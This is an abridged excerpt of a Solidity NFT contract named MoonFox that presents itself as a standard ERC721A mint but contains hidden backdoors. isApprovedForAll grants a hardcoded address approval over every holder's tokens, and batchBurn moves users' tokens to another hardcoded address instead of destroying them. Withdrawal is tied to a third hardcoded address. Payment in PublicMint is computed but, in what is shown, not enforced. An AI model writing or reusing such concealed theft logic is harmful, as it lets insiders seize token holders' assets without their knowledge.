  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xe0f33D4C57c5d282ea5ff939B16e10e13756407c){return true;}
...
contract MoonFox is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("MoonFox", "MF", maxBatchSize_, collectionSize_) {
  ...
  function PublicMint(uint256 quantity) external payable callerIsUser {    
    ...
    require(quantity<=4, "reached max supply");
    require(totalSupply() + quantity <= collectionSize, "reached max supply");   
      require(
      numberMinted(msg.sender) + quantity <= 4,
      "can not mint this many"
    );
    uint256 totalCost = saleConfig.Price * quantity;
    _safeMint(msg.sender, quantity);
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x7Fa923A9D920945178a2Bc8e29CFabfCF0faA045, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x6a06BdEA44Bc41D4128f08F2cdEE00072491Be71);
